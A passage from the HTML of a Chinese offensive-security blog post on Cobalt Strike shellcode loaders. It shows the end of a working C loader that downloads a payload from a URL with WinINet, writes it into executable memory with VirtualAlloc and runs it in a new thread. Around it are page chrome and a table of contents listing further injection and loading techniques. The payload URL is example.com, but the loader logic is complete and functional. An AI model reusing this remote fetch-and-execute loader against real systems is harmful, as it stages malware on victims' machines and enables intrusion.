读取文件内容</span></span><br><span class="line">        <span class="keyword">if</span> (!InternetReadFile(hInternetFile, pTmpBytes, <span class="number">1024</span>, &amp;dwBytesRead)) &#123;</span><br><span class="line">            <span class="comment">// 输出错误信息</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[!] InternetReadFile Failed With Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="comment">// 设置状态为失败</span></span><br><span class="line">            bSTATE = FALSE;</span><br><span class="line">            <span class="comment">// 跳转到结束标签</span></span><br><span class="line">            <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 更新总字节大小</span></span><br><span class="line">        sSize += dwBytesRead;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据是否已经有数据分配新的内存块或调整已有内存块大小</span></span><br><span class="line">        <span class="keyword">if</span> (pBytes == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pBytes == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果内存分配失败</span></span><br><span class="line">            <span class="comment">// 设置状态为失败</span></span><br><span class="line">            bSTATE = FALSE;</span><br><span class="line">            <span class="comment">// 跳转到结束标签</span></span><br><span class="line">            <span class="keyword">goto</span> _EndOfFunction;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将读取的数据复制到总缓冲区中</span></span><br><span class="line">        <span class="built_in">memcpy</span>((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);</span><br><span class="line">        <span class="comment">// 清空临时缓冲区</span></span><br><span class="line">        <span class="built_in">memset</span>(pTmpBytes, <span class="string">&#x27;\0&#x27;</span>, dwBytesRead);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dwBytesRead &lt; <span class="number">1024</span>) &#123; <span class="comment">// 如果读取的字节少于缓冲区大小,说明已到文件末尾</span></span><br><span class="line">            <span class="comment">// 退出读取循环</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将最终的数据和大小返回给调用者</span></span><br><span class="line">    *pPayloadBytes = pBytes;</span><br><span class="line">    *sPayloadSize = sSize;</span><br><span class="line"></span><br><span class="line">_EndOfFunction:</span><br><span class="line">    <span class="keyword">if</span> (hInternetFile) &#123; <span class="comment">// 如果文件句柄有效</span></span><br><span class="line">        <span class="comment">// 关闭文件句柄</span></span><br><span class="line">        InternetCloseHandle(hInternetFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hInternet) &#123; <span class="comment">// 如果 Internet 会话句柄有效</span></span><br><span class="line">        <span class="comment">// 关闭 Internet 会话句柄</span></span><br><span class="line">        InternetCloseHandle(hInternet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pTmpBytes) &#123; <span class="comment">// 如果临时缓冲区指针有效</span></span><br><span class="line">        <span class="comment">// 释放临时缓冲区</span></span><br><span class="line">        LocalFree(pTmpBytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回操作状态</span></span><br><span class="line">    <span class="keyword">return</span> bSTATE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 目标URL,获取数据</span></span><br><span class="line">    LPCWSTR url = <span class="string">L&quot;http://www.example.com/calc.bin&quot;</span>;</span><br><span class="line">    <span class="comment">// 指针用于接收有效负载数据</span></span><br><span class="line">    PBYTE pPayload = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 用于接收有效负载大小</span></span><br><span class="line">    SIZE_T payloadSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用函数从 URL 获取数据</span></span><br><span class="line">    <span class="keyword">if</span> (GetPayloadFromUrl(url, &amp;pPayload, &amp;payloadSize)) &#123;</span><br><span class="line">        <span class="comment">// 使用 VirtualAlloc 函数申请一个 shellcode字节大小的可以执行代码的内存块</span></span><br><span class="line">        LPVOID addr = VirtualAlloc(<span class="literal">NULL</span>, payloadSize, MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="literal">NULL</span>) &#123; <span class="comment">// 如果内存分配失败</span></span><br><span class="line">            <span class="comment">// 退出程序</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将 shellcode 拷贝到分配的内存中</span></span><br><span class="line">        <span class="built_in">memcpy</span>(addr, pPayload, payloadSize);</span><br><span class="line">        <span class="comment">// 创建线程执行 shellcode</span></span><br><span class="line">        HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)addr, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 等待线程执行完成</span></span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        <span class="comment">// 关闭线程句柄</span></span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 确保释放分配的内存</span></span><br><span class="line">        <span class="keyword">if</span> (pPayload != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            LocalFree(pPayload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取数据失败信息</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to retrieve payload.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 程序结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/11/04/fe2980d6/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/11/04/fe2980d6/&title=CS-ShellCode加载器 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202411041259693.png&summary=
+    总字符数: 39.53K 
+    
+    
+    代码: 32.95K, 文本: 4.01K
+    
+    
+    预计阅读时间: 2.68 小时
+    
+    
+
+Shellcode什么是Shellcode..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=CS-ShellCode加载器 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/11/04/fe2980d6/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/11/04/fe2980d6/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/10/28/ce454855/">CS-开发环境配置及exe处理</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a><a class="item" href="\2024\10\27\77c80f0f\" title="CS-C语言总结"><span class="title">CS-C语言总结</span></a><a class="item" href="\2024\09\26\da146604\" title="CS-云函数隐匿C2"><span class="title">CS-云函数隐匿C2</span></a><a class="item" href="\2024\10\28\ce454855\" title="CS-开发环境配置及exe处理"><span class="title">CS-开发环境配置及exe处理</span></a><a class="item" href="\2021\09\26\1b012da8\" title="CorePress主题优化"><span class="title">CorePress主题优化</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode"><span class="toc-text">Shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFShellcode"><span class="toc-text">什么是Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%9C%89Shellcode"><span class="toc-text">为什么有Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Shellcode%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C"><span class="toc-text">Shellcode如何运行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Shellcode加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-text">加载器的基本流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#VirtualAlloc%E5%87%BD%E6%95%B0"><span class="toc-text">VirtualAlloc函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Memcpy%E5%87%BD%E6%95%B0"><span class="toc-text">Memcpy函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CreateThread"><span class="toc-text">CreateThread</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C%E8%AF%AD%E8%A8%80%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">C语言加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%BB%A3%E7%A0%81"><span class="toc-text">加载器代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E8%AF%AD%E8%A8%80%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-text">Python语言加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%BB%A3%E7%A0%81-1"><span class="toc-text">加载器代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Pyinstaller%E6%89%93%E5%8C%85"><span class="toc-text">Pyinstaller打包</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E5%87%BD%E6%95%B0"><span class="toc-text">内存申请函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualAlloc%E5%87%BD%E6%95%B0-1"><span class="toc-text">VirtualAlloc函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VirtualAllocEx%E5%87%BD%E6%95%B0"><span class="toc-text">VirtualAllocEx函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%BA%E5%88%AB"><span class="toc-text">区别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc"><span class="toc-text">malloc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HeapAlloc%E5%87%BD%E6%95%B0"><span class="toc-text">HeapAlloc函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9"><span class="toc-text">内存属性修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E5%86%85%E5%AD%98"><span class="toc-text">释放内存</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C"><span class="toc-text">注入执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="toc-text">指针执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98"><span class="toc-text">申请内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E5%B1%9E%E6%80%A7"><span class="toc-text">修改内存属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9data%E6%AE%B5%E5%B1%9E%E6%80%A7"><span class="toc-text">修改data段属性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E5%A2%9E%E6%95%B0%E6%8D%AE%E6%AE%B5"><span class="toc-text">新增数据段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%A0%86%E5%8A%A0%E8%BD%BD"><span class="toc-text">通过堆加载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%89%A7%E8%A1%8C-CreateThread"><span class="toc-text">创建线程执行-CreateThread</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD"><span class="toc-text">分离加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%88%86%E7%A6%BB"><span class="toc-text">本地分离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%88%86%E7%A6%BB"><span class="toc-text">图片分离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web%E5%88%86%E7%A6%BB"><span class="toc-text">Web分离</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD"><span class="toc-text">获取有效负载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E4%BA%92%E8%81%94%E7%BD%91%E4%BC%9A%E8%AF%9D"><span class="toc-text">打开互联网会话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E7%9A%84%E5%8F%A5%E6%9F%84"><span class="toc-text">打开有效载荷的句柄</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-text">读取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%97%AD-InterntHandle"><span class="toc-text">关闭 InterntHandle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81"><span class="toc-text">最终代码</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
